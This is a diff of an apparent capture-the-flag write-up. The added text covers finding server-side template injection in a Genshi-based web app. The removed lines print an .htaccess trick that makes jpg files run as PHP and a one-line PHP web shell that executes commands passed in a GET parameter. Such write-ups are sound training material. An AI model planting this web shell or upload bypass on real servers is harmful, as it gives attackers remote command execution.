@@ -10,21 +10,13 @@ We clearly recognize that there's a potential SSTI (Server-Side template injecti
 
 So we see that the {7*7} is well interpreted
 
-![i2](14.jpg)
+We can continue with a random payload to learn more about the template engine, by triggering an error :
 
+![i2](7.jpg)
 
-First we'll upload an .htaccess that will allow us to upload jpg files but interpreted as php. The trick here is to inject some php code in the jpg file, we can use burpsuite for it.
-The .htaccess file contains `AddType application/x-httpd-php .jpg`.
+We get an error that tells us the name of the engine: Genshi, I didn't use this info but it may be useful in other ways of exploitation or challenges.
+Let's go on with a classic payload to execute a bash command, it returns 0 so the command was successful (1 if execution error).
 
-We can then upload an image with the following code giving us a web shell:
-`<?php if(isset($_GET["cmd"])) system($_GET["cmd"]); ?>`
-
-![i2](17.jpg)
-
-Let's gooo our getshell works we can use the command we want, starting with a classic ls and some others commands until we reach the flag by exploring.
-
-![i2](18.jpg)
-![i2](19.jpg)
-![i2](20.jpg)
+![i2](8.jpg)
 
 Flagged !
